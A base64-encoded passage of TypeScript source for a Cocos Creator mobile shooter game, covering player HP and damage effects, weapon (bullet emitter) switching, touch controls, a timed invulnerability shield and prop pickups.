iAgICAgICAgICAgIHJldHVybjtcclxuICAgICAgICB9XHJcbiAgICAgICAgaWYgKHRoaXMuX2hwIDw9IDApcmV0dXJuO1xyXG4gICAgICAgIGxldCBkYW1hZ2UgPSB0aGlzLl9ocCAtIHZhbHVlO1xyXG4gICAgICAgIHdpbmRvd1snR2FtZUxhYmVsc0NvbnRyb2xsZXInXSAuZmx5KGAtJHtleHQuc2hvcnRGb3JtYXQoZGFtYWdlKX1gLCB0aGlzLnJvbGUubm9kZS5wb3NpdGlvbi5hZGQoY2MudjIoMCwgdGhpcy5yb2xlLnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzKSkpO1xyXG4gICAgICAgIHRoaXMuX2hwID0gdmFsdWU7XHJcbiAgICAgICAgaWYgKHZhbHVlIDw9IDApe1xyXG4gICAgICAgICAgICBHYW1lUHJveHkuZW1pdChHYW1lUHJveHkuRXZlbnQuS2lsbFJvbGUpO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLnVwZGF0ZUhwUHJvZ3Jlc3MoKTtcclxuICAgICAgICB0aGlzLmJlQXR0YWNrU2tlLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLmJlQXR0YWNrU2tlLnNldEFuaW1hdGlvbigwLCBcImNyYXp5XCIsIGZhbHNlKTtcclxuICAgICAgICBNdXNpYy5wbGF5U0ZYKFwic291bmQvbXNjX3JvbDAwMVwiKTtcclxuICAgICAgICB0aGlzLmhwQmFyTm9kZS5jb2xvciA9IGNjLkNvbG9yLlJFRDtcclxuICAgICAgICB0aGlzLnJvbGUuc3ByaXRlTm9kZS5jb2xvciA9IGNjLkNvbG9yLlJFRDtcclxuICAgICAgICBsZXQgYWN0aW9uID0gY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKDAuMiksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMuaHBCYXJOb2RlLmNvbG9yID0gY2MuQ29sb3IuR1JFRU47XHJcbiAgICAgICAgICAgIHRoaXMucm9sZS5zcHJpdGVOb2RlLmNvbG9yID0gY2MuQ29sb3IuV0hJVEU7XHJcbiAgICAgICAgfSkpO1xyXG4gICAgICAgIGFjdGlvbi5zZXRUYWcoOTAxKTtcclxuICAgICAgICB0aGlzLnJvbGUubm9kZS5zdG9wQWN0aW9uQnlUYWcoOTAxKTtcclxuICAgICAgICB0aGlzLnJvbGUubm9kZS5ydW5BY3Rpb24oYWN0aW9uKTtcclxuICAgIH1cclxuXHJcbiAgICBodWlYdWUoYWRkOm51bWJlcil7XHJcbiAgICAgICAgdGhpcy5faHAgKz0gYWRkO1xyXG4gICAgICAgIGlmICh0aGlzLl9ocCA+IHRoaXMubWF4SHApe1xyXG4gICAgICAgICAgICB0aGlzLl9ocCA9IHRoaXMubWF4SHA7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMudXBkYXRlSHBQcm9ncmVzcygpO1xyXG4gICAgfVxyXG5cclxuICAgIHVwZGF0ZUhwUHJvZ3Jlc3MoKXtcclxuICAgICAgICB0aGlzLmhwUHJvZ3Jlc3NCYXIucHJvZ3Jlc3MgPSB0aGlzLl9ocCAvIHRoaXMubWF4SHA7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBfYnVsbGV0RW1pdHRlcjpudW1iZXIgPSAwO1xyXG5cclxuXHJcbiAgICBnZXQgYnVsbGV0RW1pdHRlcigpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9idWxsZXRFbWl0dGVyO1xyXG4gICAgfVxyXG5cclxuICAgIHNldCBidWxsZXRFbWl0dGVyKHZhbHVlOiBudW1iZXIpIHtcclxuICAgICAgICBpZiAodGhpcy5fYnVsbGV0RW1pdHRlciAhPSAwKXtcclxuICAgICAgICAgICAgTXVzaWMucGxheVNGWChcInNvdW5kL21zY19yb2wwMDNcIik7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGlmICh0aGlzLl9idWxsZXRFbWl0dGVyICE9IHZhbHVlKXtcclxuICAgICAgICAgICAgdGhpcy5fYnVsbGV0RW1pdHRlciA9IHZhbHVlO1xyXG4gICAgICAgICAgICBsZXQgZ2FtZUJ1bGxldHNDb250cm9sbGVyID0gd2luZG93WydHYW1lQnVsbGV0c0NvbnRyb2xsZXInXTtcclxuICAgICAgICAgICAgbGV0IGJ1bGxldEVtaXR0ZXI6QnVsbGV0RW1pdHRlciA9IG51bGw7XHJcbiAgICAgICAgICAgIHN3aXRjaCAodGhpcy5fYnVsbGV0RW1pdHRlcil7XHJcbiAgICAgICAgICAgICAgICBjYXNlIEJ1bGxldEVtaXR0ZXIuVFlQRVMuU2hvdVFpYW5nOlxyXG4gICAgICAgICAgICAgICAgICAgIGJ1bGxldEVtaXR0ZXIgPSBuZXcgQnVsbGV0RW1pdHRlclNob3VRaWFuZyhnYW1lQnVsbGV0c0NvbnRyb2xsZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICAgICAgY2FzZSBCdWxsZXRFbWl0dGVyLlRZUEVTLlBlblppOlxyXG4gICAgICAgICAgICAgICAgICAgIGJ1bGxldEVtaXR0ZXIgPSBuZXcgQnVsbGV0RW1pdHRlclBlblppKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgICAgICBjYXNlIEJ1bGxldEVtaXR0ZXIuVFlQRVMuSmlhVGVMaW46XHJcbiAgICAgICAgICAgICAgICAgICAgYnVsbGV0RW1pdHRlciA9IG5ldyBCdWxsZXRFbWl0dGVySmlhVGVMaW4oZ2FtZUJ1bGxldHNDb250cm9sbGVyKTtcclxuICAgICAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgICAgIGNhc2UgQnVsbGV0RW1pdHRlci5UWVBFUy5TYW5EYW5RaWFuZzpcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyID0gbmV3IEJ1bGxldEVtaXR0ZXJTYW5EYW5RaWFuZyhnYW1lQnVsbGV0c0NvbnRyb2xsZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICAgICAgY2FzZSBCdWxsZXRFbWl0dGVyLlRZUEVTLkp1SmlRaWFuZzpcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyID0gbmV3IEJ1bGxldEVtaXR0ZXJKdUppUWlhbmcoZ2FtZUJ1bGxldHNDb250cm9sbGVyKTtcclxuICAgICAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgICAgIGNhc2UgQnVsbGV0RW1pdHRlci5UWVBFUy5MaVppUGFvOlxyXG4gICAgICAgICAgICAgICAgICAgIGJ1bGxldEVtaXR0ZXIgPSBuZXcgQnVsbGV0RW1pdHRlckxpWmlQYW8oZ2FtZUJ1bGxldHNDb250cm9sbGVyKTtcclxuICAgICAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgICAgIGNhc2UgQnVsbGV0RW1pdHRlci5UWVBFUy5IdW9KaWFuVG9uZzpcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyID0gbmV3IEJ1bGxldEVtaXR0ZXJIdW9KaWFuVG9uZyhnYW1lQnVsbGV0c0NvbnRyb2xsZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICAgICAgY2FzZSBCdWxsZXRFbWl0dGVyLlRZUEVTLlNoYW5EaWFuUWl1OlxyXG4gICAgICAgICAgICAgICAgICAgIGJ1bGxldEVtaXR0ZXIgPSBuZXcgQnVsbGV0RW1pdHRlclNoYW5EaWFuUWl1KGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgICAgICBjYXNlIEJ1bGxldEVtaXR0ZXIuVFlQRVMuSmlHdWFuZzpcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXRFbWl0dGVyID0gbmV3IEJ1bGxldEVtaXR0ZXJKaUd1YW5nKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgICAgICBjYXNlIEJ1bGxldEVtaXR0ZXIuVFlQRVMuSHVvWWFuOlxyXG4gICAgICAgICAgICAgICAgICAgIGJ1bGxldEVtaXR0ZXIgPSBuZXcgQnVsbGV0RW1pdHRlckh1b1lhbihnYW1lQnVsbGV0c0NvbnRyb2xsZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIHRoaXMuYnVsbGV0RW1pdHRlckRlbGVnYXRlID0gYnVsbGV0RW1pdHRlcjtcclxuICAgICAgICAgICAgYnVsbGV0RW1pdHRlci5pbml0KHRoaXMuX2J1bGxldEVtaXR0ZXIpO1xyXG4gICAgICAgICAgICAvLyB0aGlzLndlYXBvblNrZS5ub2RlLnNjYWxlID0gMDtcclxuICAgICAgICAgICAgLy8gdGhpcy53ZWFwb25Ta2Uubm9kZS5ydW5BY3Rpb24oY2Muc2NhbGVUbygwLjM1LCAwLjU1KS5lYXNpbmcoY2MuZWFzZUJhY2tPdXQoKSkpO1xyXG4gICAgICAgICAgICB0aGlzLndlYXBvblNrZS5zZXRTa2luKChcIjAwMFwiK3RoaXMuX2J1bGxldEVtaXR0ZXIpLnN1YnN0cigtMykpO1xyXG4gICAgICAgICAgICB0aGlzLndlYXBvblNrZS5zZXRBbmltYXRpb24oMCwgXCJndW5fMDAyXCIsIGZhbHNlKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBfYnVsbGV0RW1pdHRlckRlbGVnYXRlOkJ1bGxldEVtaXR0ZXIgPSBudWxsO1xyXG5cclxuXHJcbiAgICBnZXQgYnVsbGV0RW1pdHRlckRlbGVnYXRlKCk6IEJ1bGxldEVtaXR0ZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9idWxsZXRFbWl0dGVyRGVsZWdhdGU7XHJcbiAgICB9XHJcblxyXG4gICAgc2V0IGJ1bGxldEVtaXR0ZXJEZWxlZ2F0ZSh2YWx1ZTogQnVsbGV0RW1pdHRlcikge1xyXG4gICAgICAgIGlmICh0aGlzLl9idWxsZXRFbWl0dGVyRGVsZWdhdGUpe1xyXG4gICAgICAgICAgICB0aGlzLl9idWxsZXRFbWl0dGVyRGVsZWdhdGUub25FeGl0KCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMuX2J1bGxldEVtaXR0ZXJEZWxlZ2F0ZSA9IHZhbHVlO1xyXG4gICAgICAgIHRoaXMuX2J1bGxldEVtaXR0ZXJEZWxlZ2F0ZS5vbkVudGVyKCk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHByaXZhdGUgX3RvdWNoSWQgPSBudWxsO1xyXG4gICAgcHJpdmF0ZSBfYk1vdmUgPSBmYWxzZTtcclxuICAgIHByaXZhdGUgX2RpciA9IGNjLnYyKCk7XHJcblxyXG5cclxuICAgIHNldCB0b3VjaElkKHZhbHVlOiBhbnkpIHtcclxuICAgICAgICB0aGlzLl90b3VjaElkID0gdmFsdWU7XHJcbiAgICAgICAgLy8gaWYgKHRoaXMuX3RvdWNoSWQgPT0gbnVsbCl7XHJcbiAgICAgICAgLy8gICAgIEdhbWVQcm94eS5zbG93R2FtZSA9IHRydWU7XHJcbiAgICAgICAgLy8gfSBlbHNlIHtcclxuICAgICAgICAvLyAgICAgR2FtZVByb3h5LnNsb3dHYW1lID0gZmFsc2U7XHJcbiAgICAgICAgLy8gfVxyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgX2ZpcmVDRCA9IDA7XHJcblxyXG4gICAgcHJpdmF0ZSBfYmdCb3VuZHMgPSBjYy5yZWN0KCk7XHJcbiAgICBwcml2YXRlIF9yb2xlQm91bmRzID0gY2MucmVjdCgpO1xyXG5cclxuXHJcbiAgICBnZXQgZGlyKCk6IGNjLlZlYzIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9kaXI7XHJcbiAgICB9XHJcblxyXG4gICAgZ2V0IGJNb3ZlKCk6IGJvb2xlYW4ge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9iTW92ZTtcclxuICAgIH1cclxuXHJcbiAgICBvbkxvYWQgKCkge1xyXG4gICAgICAgIHRoaXMuX3JhZGl1cyA9IHRoaXMucmluZy53aWR0aC8yO1xyXG4gICAgICAgIGlmICh0aGlzLmpveXN0aWNrVHlwZSA9PSBKb3lzdGlja1R5cGUuRk9MTE9XKSB7XHJcbiAgICAgICAgICAgIHRoaXMucmluZy5vcGFjaXR5ID0gMDtcclxuICAgICAgICAgICAgdGhpcy5kb3Qub3BhY2l0eSA9IDA7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMucm9sZS5ub2RlLm9uKGNjLk5vZGUuRXZlbnRUeXBlLlBPU0lUSU9OX0NIQU5HRUQsIHRoaXMub25Sb2xlUG9zaXRpb25DaGFuZ2VkLCB0aGlzKTtcclxuICAgICAgICB0aGlzLm5vZGUub24oR2FtZVByb3h5LkV2ZW50LlBhdXNlR2FtZSwgdGhpcy5vblBhdXNlR2FtZSwgdGhpcyk7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9uKEdhbWVQcm94eS5FdmVudC5Jbml0R2FtZSwgdGhpcy5vbkluaXRHYW1lLCB0aGlzKTtcclxuICAgICAgICB0aGlzLm5vZGUub24oR2FtZVByb3h5LkV2ZW50LlN0YXJ0R2FtZSwgdGhpcy5vblN0YXJ0R2FtZSwgdGhpcyk7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9uKEdhbWVQcm94eS5FdmVudC5SZWxpdmVHYW1lLCB0aGlzLm9uUmVsaXZlR2FtZSwgdGhpcyk7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9uKEdhbWVQcm94eS5FdmVudC5VcGRhdGVCdWxsZXRDb3VudCwgdGhpcy5vblVwZGF0ZUJ1bGxldENvdW50LCB0aGlzKTtcclxuICAgICAgICB0aGlzLm5vZGUub24oR2FtZVByb3h5LkV2ZW50LlByb3BUcmlnZ2VyLCB0aGlzLm9uUHJvcFRyaWdnZXIsIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vbihHYW1lUHJveHkuRXZlbnQuUHJvcENEWmVybywgdGhpcy5vblByb3BDRFplcm8sIHRoaXMpO1xyXG4gICAgICAgIHRoaXMuYmVBdHRhY2tTa2Uuc2V0Q29tcGxldGVMaXN0ZW5lcigodHJhY2tFbnRyeSwgbG9vcENvdW50KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBuYW1lID0gdHJhY2tFbnRyeS5hbmltYXRpb24gPyB0cmFja0VudHJ5LmFuaW1hdGlvbi5uYW1lIDogJyc7XHJcbiAgICAgICAgICAgIHRoaXMuYmVBdHRhY2tTa2Uubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB9KTtcclxuICAgICAgICB0aGlzLmJlQXR0YWNrU2tlLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5iZUF0dGFja1NrZS5ub2RlLnNjYWxlWSA9IGNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS5oZWlnaHQvMTMzNDtcclxuICAgICAgICB0aGlzLndlYXBvblNrZS5zZXRDb21wbGV0ZUxpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wQ291bnQpID0+e1xyXG4gICAgICAgICAgICBsZXQgbmFtZSA9IHRyYWNrRW50cnkuYW5pbWF0aW9uID8gdHJhY2tFbnRyeS5hbmltYXRpb24ubmFtZSA6ICcnO1xyXG4gICAgICAgICAgICBpZiAobmFtZSA9PSAnZ3VuXzAwMicpe1xyXG4gICAgICAgICAgICAgICAgdGhpcy53ZWFwb25Ta2Uuc2V0QW5pbWF0aW9uKDAsIFwiZ3VuXCIsIGZhbHNlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgICAgIHdpbmRvd1snR2FtZVJvbGVDb250cm9sbGVyJ10gPSB0aGlzO1xyXG4gICAgfVxyXG5cclxuICAgIG9uVXBkYXRlQnVsbGV0Q291bnQoKXtcclxuICAgICAgICBsZXQgc3RyID0gYHgke3RoaXMuX2J1bGxldEVtaXR0ZXJEZWxlZ2F0ZS5idWxsZXRDb3VudH1gO1xyXG4gICAgICAgIGlmICh0aGlzLl9idWxsZXRFbWl0dGVyID09IDEpe1xyXG4gICAgICAgICAgICBzdHIgPSAn4oieJztcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5wYXlsb2FkTGFiZWwuc3RyaW5nID0gc3RyO1xyXG4gICAgICAgIGxldCBudW0gPSB0aGlzLnBheWxvYWRCYXJzLmxlbmd0aDtcclxuICAgICAgICBpZiAodGhpcy5fYnVsbGV0RW1pdHRlckRlbGVnYXRlLnBheWxvYWQgPiAwKXtcclxuICAgICAgICAgICAgbnVtID0gTWF0aC5jZWlsKHRoaXMuX2J1bGxldEVtaXR0ZXJEZWxlZ2F0ZS5idWxsZXRDb3VudC90aGlzLl9idWxsZXRFbWl0dGVyRGVsZWdhdGUucGF5bG9hZCp0aGlzLnBheWxvYWRCYXJzLmxlbmd0aCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMucGF5bG9hZEJhcnMuZm9yRWFjaCgodmFsdWUsIGluZGV4KSA9PiB2YWx1ZS5hY3RpdmUgPSBpbmRleCA8IG51bSk7XHJcbiAgICB9XHJcblxyXG4gICAgb25QYXVzZUdhbWUocGF1c2U6Ym9vbGVhbil7XHJcbiAgICAgICAgaWYgKHBhdXNlKXtcclxuICAgICAgICAgICAgdGhpcy50b3VjaElkID0gbnVsbDtcclxuICAgICAgICAgICAgdGhpcy5fYk1vdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgdGhpcy5kb3Quc2V0UG9zaXRpb24odGhpcy5yaW5nLmdldFBvc2l0aW9uKCkpO1xyXG4gICAgICAgICAgICBpZiAodGhpcy5qb3lzdGlja1R5cGUgPT0gSm95c3RpY2tUeXBlLkZPTExPVykge1xyXG4gICAgICAgICAgICAgICAgdGhpcy5yaW5nLm9wYWNpdHkgPSAwO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5kb3Qub3BhY2l0eSA9IDA7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgb25Jbml0R2FtZSgpe1xyXG4gICAgICAgIHRoaXMubWF4SHAgPSB0aGlzLl9ocCA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvblVwKVtXb3JsZC5TdG9yYWdlLkhwTHYtMV1bJ2xpZmUnXTtcclxuICAgICAgICB0aGlzLnVwZGF0ZUhwUHJvZ3Jlc3MoKTtcclxuICAgICAgICB0aGlzLnNldEltcGVuZXRyYWJsZURlZmVuY2VDRCgzKTtcclxuICAgIH1cclxuXHJcbiAgICBzZXRJbXBlbmV0cmFibGVEZWZlbmNlQ0QoY2Q6bnVtYmVyKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcInNldEltcGVuZXRyYWJsZURlZmVuY2VDRD09PlwiLCBjZCk7XHJcbiAgICAgICAgdGhpcy5pbXBlbmV0cmFibGVEZWZlbmNlLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLmltcGVuZXRyYWJsZURlZmVuY2UudW5ibGluaygpO1xyXG4gICAgICAgIGxldCBhY3Rpb24gPSBjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoY2QtMSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMuaW1wZW5ldHJhYmxlRGVmZW5jZS5ibGluaygpO1xyXG4gICAgICAgIH0pLCBjYy5kZWxheVRpbWUoMSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMuaW1wZW5ldHJhYmxlRGVmZW5jZS5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH0pKTtcclxuICAgICAgICBhY3Rpb24uc2V0VGFnKDg4OSk7XHJcbiAgICAgICAgdGhpcy5yb2xlLm5vZGUuc3RvcEFjdGlvbkJ5VGFnKDg4OSk7XHJcbiAgICAgICAgdGhpcy5yb2xlLm5vZGUucnVuQWN0aW9uKGFjdGlvbik7XHJcbiAgICB9XHJcblxyXG4gICAgb25TdGFydEdhbWUoKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIm9uU3RhcnRHYW1lPT09PlwiLCBHYW1lUHJveHkucGF1c2VHYW1lKTtcclxuICAgICAgICB0aGlzLm5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfU1RBUlQsIHRoaXMub25Ub3VjaFN0YXJ0LCB0aGlzKTtcclxuICAgICAgICB0aGlzLm5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfTU9WRSwgdGhpcy5vblRvdWNoTW92ZSwgdGhpcyk7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9uKGNjLk5vZGUuRXZlbnRUeXBlLlRPVUNIX0VORCwgdGhpcy5vblRvdWNoRW5kLCB0aGlzKTtcclxuICAgICAgICB0aGlzLm5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfQ0FOQ0VMLCB0aGlzLm9uVG91Y2hFbmQsIHRoaXMpO1xyXG4gICAgICAgIGlmICghV29ybGQuTXkubmV3Ymllcy5zdGF0ZShcIkZpcnN0RW50cnlHYW1lXCIpKXtcclxuICAgICAgICAgICAgdGhpcy5ndWlkZU5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIHRoaXMuZ2V0Q29tcG9uZW50KEdhbWVDb250cm9sbGVyKS5zdGFydEdlbmVyYXRpbmcoKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgb25SZWxpdmVHYW1lKCl7XHJcbiAgICAgICAgdGhpcy5vbkluaXRHYW1lKCk7XHJcbiAgICAgICAgbGV0IHdlYXBvbkNvbmZpZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvbikuZmlsdGVyKHZhbHVlID0+IHZhbHVlWydpZCddICE9IDEpLnNvcnQoKChhLCBiKSA9PiBiWyd1bmxvY2snXSAtIGFbJ3VubG9jayddKSk7XHJcbiAgICAgICAgZm9yIChsZXQgaXRlbSBvZiB3ZWFwb25Db25maWcpe1xyXG4gICAgICAgICAgICBpZiAoR2FtZVByb3h5LmxldmVsID49IGl0ZW1bJ3VubG9jayddKXtcclxuICAgICAgICAgICAgICAgIHRoaXMuYnVsbGV0RW1pdHRlciA9IGl0ZW1bJ2lkJ107XHJcbiAgICAgICAgICAgICAgICB0aGlzLmJ1bGxldEVtaXR0ZXJEZWxlZ2F0ZS5wYXlsb2FkID0gdGhpcy5idWxsZXRFbWl0dGVyRGVsZWdhdGUucGF5bG9hZCAqIDM7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBvblJvbGVQb3NpdGlvbkNoYW5nZWQoKXtcclxuICAgICAgICB0aGlzLmhwUHJvZ3Jlc3NCYXIubm9kZS5wb3NpdGlvbiA9IHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uO1xyXG4gICAgICAgIHRoaXMuX3Rha2VQcm9wcy5mb3JFYWNoKHZhbHVlID0+IHtcclxuICAgICAgICAgICAgaWYgKHZhbHVlLmFjdGl2ZSl7XHJcbiAgICAgICAgICAgICAgICB2YWx1ZS5wb3NpdGlvbiA9IHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgb25Qcm9wVHJpZ2dlcihwcm9wOlByb3BCYXNlKSB7XHJcbiAgICAgICAgbGV0IHRha2VQcm9wTm9kZSA9IHRoaXMuZ2V0SW5hY3RpdmVUYWtlUHJvcE5vZGUoKTtcclxuICAgICAgICB0YWtlUHJvcE5vZGUucG9zaXRpb24gPSB0aGlzLnJvbGUubm9kZS5wb3NpdGlvbjtcclxuICAgICAgICB0YWtlUHJvcE5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB0YWtlUHJvcE5vZGUuc2NhbGUgPSAxO1xyXG4gICAgICAgIHRha2VQcm9wTm9kZS5vcGFjaXR5ID0gMjU1O1xyXG4gICAgICAgIHRha2VQcm9wTm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2Muc2NhbGVUbygwLjMsIDQpLCBjYy5mYWRlVG8oMC4zLCA4MCksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIHRha2VQcm9wTm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB9KSkpO1xyXG4gICAgICAgIGxldCBwcm9wSUQgPSBwcm9wLnByb3BJRDtcclxuICAgICAgICBsZXQgcHJvcE1vdmUgPSAoY2FsbGJhY2s/OigpPT52b2lkKT0+e1xyXG4gICAgICAgICAgICBsZXQgcHJvcEJhc2VOb2RlID0gY2MuaW5zdGFudGlhdGUocHJvcC5ub2RlKTtcclxuICAgICAgICAgICAgcHJvcEJhc2VOb2RlLnBvc2l0aW9uID0gdGhpcy5wcm9wU3RhdGVOb2RlLmdldFBhcmVudCgpLmNvbnZlcnRUb05vZGVTcGFjZUFSKHByb3Aubm9kZS5jb252ZXJ0VG9Xb3JsZFNwYWNlQVIoY2MudjIoKSkpO1xyXG4gICAgICAgICAgICB0aGlzLnByb3BTdGF0ZU5vZGUuZ2V0UGFyZW50KCkuYWRkQ2hpbGQocHJvcEJhc2VOb2RlKTtcclxuICAgICAgICAgICAgLyoqIOmjnuWIsOeKtuaAgeagj+eahOS9jee9riAqL1xyXG4gICAgICAgICAgICBsZXQgZmx5RHVyYXRpb24gPSAwLjM7XHJcbiAgICAgICAgICAgIGxldCBwcm9wU3RhdGVOb2RlID0gY2MuaW5zdGFudGlhdGUodGhpcy5wcm9wU3RhdGVQcmVmYWIpO1xyXG4gICAgICAgICAgICB0aGlzLnByb3BTdGF0ZU5vZGUuYWRkQ2hpbGQocHJvcFN0YXRlTm9kZSk7XHJcbiAgICAgICAgICAgIHByb3BTdGF0ZU5vZGUuc2NhbGUgPSAwO1xyXG4gICAgICAgICAgICBwcm9wU3RhdGVOb2RlLnJ1bkFjdGlvbihjYy5zY2FsZVRvKGZseUR1cmF0aW9uLCAxKSk7XHJcbiAgICAgICAgICAgIHByb3BCYXNlTm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MubW92ZVRvKGZseUR1cmF0aW9uLCB0aGlzLnByb3BTdGF0ZU5vZGUucG9zaXRpb24uYWRkKGNjLnYyKDAsIC03OC8yKSkpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgdGhpcy5wcm9wU3RhdGVOb2RlLmNoaWxkcmVuLmZvckVhY2godmFsdWUgPT4ge1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBwcm9wU3RhdGVDb25yb2xsZXIgPSB2YWx1ZS5nZXRDb21wb25lbnQoUHJvcFN0YXRlQ29udHJvbGxlcik7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKHByb3BTdGF0ZUNvbnJvbGxlci5wcm9wSUQgPT0gcHJvcElEICYmIHZhbHVlICE9IHByb3BTdGF0ZU5vZGUpe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBwcm9wU3RhdGVDb25yb2xsZXIuY2RUaW1lci5wYXVzZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHByb3BTdGF0ZUNvbnJvbGxlci5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgbGV0IHByb3BTdGF0ZUNvbnJvbGxlciA9IHByb3BTdGF0ZU5vZGUuZ2V0Q29tcG9uZW50KFByb3BTdGF0ZUNvbnRyb2xsZXIpO1xyXG4gICAgICAgICAgICAgICAgcHJvcFN0YXRlQ29ucm9sbGVyLmluaXQocHJvcElEKTtcclxuICAgICAgICAgICAgICAgIHByb3BTdGF0ZUNvbnJvbGxlci5jZFRpbWVyLnBhdXNlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICBwcm9wQmFzZU5vZGUuZGVzdHJveSgpO1xyXG4gICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKXtcclxuICAgICAgICAgICAgICAgICAgICBjYWxsYmFjaygpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgIH07XHJcbiAgICAgICAgc3dpdGNoIChwcm9wSUQpIHtcclxuICAgICAgICAgICAgY2FzZSA1OlxyXG4gICAgICAgICAgICAgICAgdGhpcy5zZXRJbXBlbmV0cmFibGVEZWZlbmNlQ0QoMTArMC4zKTtcclxuICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICBjYXNlIDExOlxyXG4gICAgICAgICAgICAgICAgdGhpcy5yb2xlLmFkZFN1cHBseShwcm9